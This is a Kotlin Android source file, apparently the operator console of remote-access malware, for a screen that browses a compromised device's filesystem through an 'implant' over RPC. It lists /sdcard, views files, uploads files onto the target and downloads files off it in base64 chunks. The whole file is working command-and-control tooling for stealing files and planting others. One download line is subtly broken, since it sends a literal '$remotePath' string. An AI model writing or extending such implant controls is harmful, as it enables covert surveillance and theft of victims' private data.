package com.shadow.operator.ui.filemanager

import android.content.ContentValues
import android.os.Build
import android.util.Base64
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowLeft
import androidx.compose.material.icons.filled.Close
import androidx.compose.material.icons.filled.Download
import androidx.compose.material.icons.filled.Search
import androidx.compose.material.icons.filled.Upload
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.viewmodel.compose.viewModel
import com.shadow.operator.data.Palette
import com.shadow.operator.data.rpcViewModelRef
import com.shadow.operator.ui.common.ScreenHeader
import com.shadow.operator.ui.common.SrcTag
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

private data class FsEntry(val type: String, val size: Long, val name: String)

private const val CHUNK = 256 * 1024

/**
 * Remote filesystem browser: list, view, download and upload.
 *
 * Listing is the implant's fs_list (tab-separated type/size/name). Transfers use
 * fs_read_b64 / fs_write_b64 in CHUNK-sized pieces because command results travel
 * as JSON strings through the worker's SQLite queue, and read_to_string on the
 * implant would corrupt anything binary.
 */
@Composable
fun FileManagerScreen(onBack: () -> Unit) {
    val rpc = rpcViewModelRef ?: return
    val scope = rememberCoroutineScope()
    val context = LocalContext.current
    var path by remember { mutableStateOf("/sdcard") }
    var inputPath by remember(path) { mutableStateOf(path) }
    var entries by remember { mutableStateOf<List<FsEntry>>(emptyList()) }
    var loading by remember { mutableStateOf(true) }
    var viewFile by remember { mutableStateOf<String?>(null) }
    var viewContent by remember { mutableStateOf<String?>(null) }
    var picked by remember { mutableStateOf<FsEntry?>(null) }
    var transfer by remember { mutableStateOf<String?>(null) }
    var busy by remember { mutableStateOf(false) }

    fun displayStatus(e: FsEntry): String = when {
        e.type == "d" -> "DIR"
        e.size >= 1024 * 1024 -> String.format("%.1f MB", e.size / 1048576.0)
        e.size >= 1024 -> String.format("%.1f KB", e.size / 1024.0)
        else -> "${e.size} B"
    }

    fun joinPath(name: String) = if (path == "/") "/$name" else "$path/$name"

    fun refresh(p: String) {
        loading = true; busy = true
        scope.launch {
            val result = rpc.execute("fs_list", """{"path":"$p"}""", 90000)
            val parsed = result.lineSequence().mapNotNull { line ->
                val parts = line.split("\t")
                if (parts.size >= 3 && (parts[0] == "d" || parts[0] == "f")) {
                    FsEntry(parts[0], parts[1].toLongOrNull() ?: 0L, parts.drop(2).joinToString("\t"))
                } else null
            }.toList()
            entries = if (parsed.any { it.name == ".." }) parsed
            else listOf(FsEntry("d", 0, "..")) + parsed
            loading = false; busy = false
        }
    }

    fun openFile(name: String) {
        viewFile = joinPath(name); viewContent = "loading…"
        scope.launch {
            viewContent = rpc.execute("fs_read", """{"path":"${viewFile!!}"}""", 90000)
        }
    }

    val uploadPicker = rememberLauncherForActivityResult(
        ActivityResultContracts.OpenDocument()
    ) { uri ->
        if (uri == null) return@rememberLauncherForActivityResult
        scope.launch {
            busy = true
            val outcome = try {
                val name = queryDisplayName(context.contentResolver, uri) ?: "upload.bin"
                val bytes = withContext(Dispatchers.IO) {
                    context.contentResolver.openInputStream(uri)?.use { it.readBytes() }
                }
                if (bytes == null) "upload aborted (could not read $name)"
                else uploadChunks(rpc, joinPath(name), bytes) { done, total ->
                    transfer = "uploading $name: $done/$total"
                }
            } catch (t: Throwable) {
                "upload failed: ${t.message}"
            }
            transfer = outcome
            busy = false
            refresh(path)
            Toast.makeText(context, outcome, Toast.LENGTH_LONG).show()
        }
    }

    LaunchedEffect(Unit) { refresh(path) }

    Scaffold(containerColor = Palette.BG) { pad ->
        Column(Modifier.padding(pad).fillMaxSize()) {
            ScreenHeader("File Manager", onBack)
            SrcTag("fs_list + fs_read_b64 + fs_write_b64 via RPC")

            Row(Modifier.fillMaxWidth().padding(horizontal = 12.dp, vertical = 6.dp)) {
                Surface(
                    shape = RoundedCornerShape(8.dp),
                    color = Color(0xFF10131A),
                    modifier = Modifier.weight(1f)
                ) {
                    Row(Modifier.padding(horizontal = 10.dp, vertical = 8.dp)) {
                        BasicTextField(
                            value = inputPath,
                            onValueChange = { inputPath = it },
                            singleLine = true,
                            textStyle = TextStyle(color = Palette.TEXT, fontSize = 13.sp, fontFamily = FontFamily.Monospace),
                            modifier = Modifier.fillMaxWidth()
                        )
                    }
                }
                Spacer(Modifier.width(8.dp))
                Surface(
                    shape = RoundedCornerShape(8.dp),
                    color = Palette.ACCEPT.copy(alpha = 0.15f),
                    modifier = Modifier.clickable {
                        path = inputPath.trim().ifEmpty { "/" }
                        refresh(path)
                    }
                ) {
                    Text("Go", color = Palette.SUCCESS, fontSize = 13.sp, fontWeight = FontWeight.Bold,
                        modifier = Modifier.padding(horizontal = 14.dp, vertical = 10.dp))
                }
                Spacer(Modifier.width(6.dp))
                Surface(
                    shape = RoundedCornerShape(8.dp),
                    color = Palette.ACCENT.copy(alpha = 0.15f),
                    modifier = Modifier.clickable(enabled = !busy) { uploadPicker.launch(arrayOf("*/*")) }
                ) {
                    Text(if (busy) "…" else "↑ Upload", color = Palette.ACCENT, fontSize = 13.sp,
                        fontWeight = FontWeight.Bold,
                        modifier = Modifier.padding(horizontal = 12.dp, vertical = 10.dp))
                }
            }

            transfer?.let {
                Text(it, color = Palette.ACCENT, fontSize = 11.sp,
                    modifier = Modifier.padding(horizontal = 12.dp, vertical = 2.dp))
            }

            if (loading) {
                Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text("loading…", color = Palette.TEXT_DIM, fontSize = 12.sp)
                }
            } else if (entries.isEmpty()) {
                Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text("empty / inaccessible", color = Palette.TEXT_DIM, fontSize = 12.sp)
                }
            } else {
                LazyColumn(Modifier.fillMaxSize()) {
                    items(entries) { e ->
                        Row(
                            Modifier.fillMaxWidth()
                                .clickable {
                                    if (e.name == ".." && path != "/") {
                                        val parent = path.removeSuffix("/")
                                        path = parent.substringBeforeLast("/", "/")
                                        inputPath = path; refresh(path)
                                    } else if (e.type == "d") {
                                        path = joinPath(e.name)
                                        inputPath = path; refresh(path)
                                    } else {
                                        picked = e
                                    }
                                }
                                .padding(horizontal = 16.dp, vertical = 10.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(
                                if (e.type == "d") "📁" else "📄",
                                fontSize = 14.sp,
                                modifier = Modifier.padding(end = 10.dp)
                            )
                            Column(Modifier.weight(1f)) {
                                Text(e.name, color = if (e.type == "d") Palette.ACCENT else Palette.TEXT,
                                    fontSize = 13.sp, fontFamily = FontFamily.Monospace)
                            }
                            if (e.type != "d") {
                                Text(displayStatus(e), color = Palette.TEXT_DIM, fontSize = 11.sp,
                                    fontFamily = FontFamily.Monospace)
                            }
                        }
                        HorizontalDivider(color = Palette.BORDER.copy(alpha = 0.3f), thickness = 0.5.dp)
                    }
                }
            }
        }
    }

    picked?.let { e ->
        AlertDialog(
            onDismissRequest = { picked = null },
            containerColor = Palette.BG_CARD,
            title = { Text(e.name, color = Palette.TEXT, fontSize = 14.sp, fontFamily = FontFamily.Monospace) },
            text = { Text("${displayStatus(e)} · ${joinPath(e.name)}", color = Palette.TEXT_DIM, fontSize = 12.sp) },
            confirmButton = {
                TextButton(enabled = !busy, onClick = {
                    picked = null
                    scope.launch {
                        busy = true
                        val out = try {
                            downloadChunks(context, rpc, joinPath(e.name), e.name, e.size) { done, total ->
                                transfer = "downloading ${e.name}: $done/$total"
                            }
                        } catch (t: Throwable) {
                            "download failed: ${t.message}"
                        }
                        transfer = out
                        busy = false
                        Toast.makeText(context, out, Toast.LENGTH_LONG).show()
                    }
                }) { Text("Download", color = Palette.SUCCESS, fontSize = 13.sp) }
            },
            dismissButton = {
                TextButton(onClick = { picked = null; openFile(e.name) }) {
                    Text("View as text", color = Palette.ACCENT, fontSize = 13.sp)
                }
            }
        )
    }

    if (viewFile != null) {
        AlertDialog(
            onDismissRequest = { viewFile = null },
            containerColor = Palette.BG_CARD,
            title = {
                Row {
                    Text(viewFile!!.substringAfterLast('/'), color = Palette.TEXT, fontSize = 14.sp,
                        fontFamily = FontFamily.Monospace, modifier = Modifier.weight(1f))
                    Icon(Icons.Default.Close, null, tint = Palette.TEXT_DIM,
                        modifier = Modifier.size(18.dp).clickable { viewFile = null })
                }
            },
            text = {
                BasicTextField(
                    value = viewContent ?: "",
                    onValueChange = {},
                    readOnly = true,
                    textStyle = TextStyle(color = Palette.TEXT.copy(alpha = 0.85f), fontSize = 11.sp, fontFamily = FontFamily.Monospace, lineHeight = 17.sp),
                    modifier = Modifier.fillMaxWidth().heightIn(max = 400.dp)
                )
            },
            confirmButton = { TextButton(onClick = { viewFile = null }) { Text("Close", color = Palette.ACCENT, fontSize = 13.sp) } }
        )
    }
}

/** Upload [bytes] to [remotePath] in CHUNK pieces: first write truncates, rest append. */
private suspend fun uploadChunks(
    rpc: com.shadow.operator.data.RpcClient,
    remotePath: String,
    bytes: ByteArray,
    progress: (Long, Long) -> Unit,
): String {
    val total = bytes.size.toLong()
    var offset = 0
    var part = 0
    while (offset < bytes.size) {
        val end = minOf(offset + CHUNK, bytes.size)
        val chunk = bytes.copyOfRange(offset, end)
        val b64 = Base64.encodeToString(chunk, Base64.NO_WRAP)
        val payload = com.google.gson.JsonObject().apply {
            addProperty("path", remotePath)
            addProperty("b64", b64)
            addProperty("append", part > 0)
        }.toString()
        // Escape quotes/backslashes is handled by Gson above; the implant decodes
        // base64 so no byte content can break the JSON envelope.
        val res = rpc.execute("fs_write_b64", payload, 90000)
        if (res.startsWith("fs error") || res.startsWith("ERROR")) {
            return "upload failed at offset $offset: $res"
        }
        offset = end
        part++
        progress(offset.toLong(), total)
    }
    return "uploaded $total bytes → $remotePath ($part chunks)"
}

/** Download [remotePath] via chunked fs_read_b64 and save it on the operator. */
private suspend fun downloadChunks(
    ctx: android.content.Context,
    rpc: com.shadow.operator.data.RpcClient,
    remotePath: String,
    name: String,
    size: Long,
    progress: (Long, Long) -> Unit,
): String {
    val out = java.io.ByteArrayOutputStream()
    var offset = 0L
    var guard = 0
    while (true) {
        if (++guard > 4000) return "aborted after $guard chunks (file too large?)"
        val payload = """{"path":"${'$'}remotePath","offset":$offset,"len":$CHUNK}"""
        val res = rpc.execute("fs_read_b64", payload, 90000)
        val obj = try {
            com.google.gson.JsonParser.parseString(res).asJsonObject
        } catch (t: Throwable) {
            return "download failed: ${res.take(160)}"
        }
        if (obj.has("error")) return "download failed: ${obj.get("error").asString}"
        val b64 = if (obj.has("b64")) obj.get("b64").asString else ""
        if (b64.isNotEmpty()) out.write(Base64.decode(b64, Base64.NO_WRAP))
        offset += CHUNK
        val eof = obj.has("eof") && obj.get("eof").asBoolean
        progress(minOf(offset, size), size)
        if (eof) break
    }
    val bytes = out.toByteArray()
    return saveToDownloads(ctx, name, bytes)
}

/**
 * Persist a downloaded file where the user can actually find it: MediaStore
 * Downloads on Q+, the app's external files dir below that.
 */
private fun saveToDownloads(
    ctx: android.content.Context,
    name: String,
    bytes: ByteArray,
): String {
    return try {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val values = ContentValues().apply {
                put(android.provider.MediaStore.Downloads.DISPLAY_NAME, name)
                put(android.provider.MediaStore.Downloads.SIZE, bytes.size.toLong())
                put(android.provider.MediaStore.Downloads.MIME_TYPE, "application/octet-stream")
                put(
                    android.provider.MediaStore.Downloads.RELATIVE_PATH,
                    android.os.Environment.DIRECTORY_DOWNLOADS + "/SHADOW"
                )
            }
            val uri = ctx.contentResolver.insert(
                android.provider.MediaStore.Downloads.EXTERNAL_CONTENT_URI, values
            ) ?: return "insert into Downloads failed"
            ctx.contentResolver.openOutputStream(uri)?.use { it.write(bytes) }
                ?: return "openOutputStream failed"
            "saved ${bytes.size} bytes → Downloads/SHADOW/$name"
        } else {
            val dir = ctx.getExternalFilesDir(android.os.Environment.DIRECTORY_DOWNLOADS)
                ?: ctx.filesDir
            val f = java.io.File(dir, name)
            f.writeBytes(bytes)
            "saved ${bytes.size} bytes → ${f.absolutePath}"
        }
    } catch (t: Throwable) {
        "save failed: ${t.message}"
    }
}

private fun queryDisplayName(
    resolver: android.content.ContentResolver,
    uri: android.net.Uri,
): String? {
    if (uri.scheme != "content") return uri.lastPathSegment
    return try {
        resolver.query(uri, null, null, null, null)?.use { c ->
            val i = c.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME)
            if (i >= 0 && c.moveToFirst()) c.getString(i) else uri.lastPathSegment
        }
    } catch (t: Throwable) {
        uri.lastPathSegment
    }
}
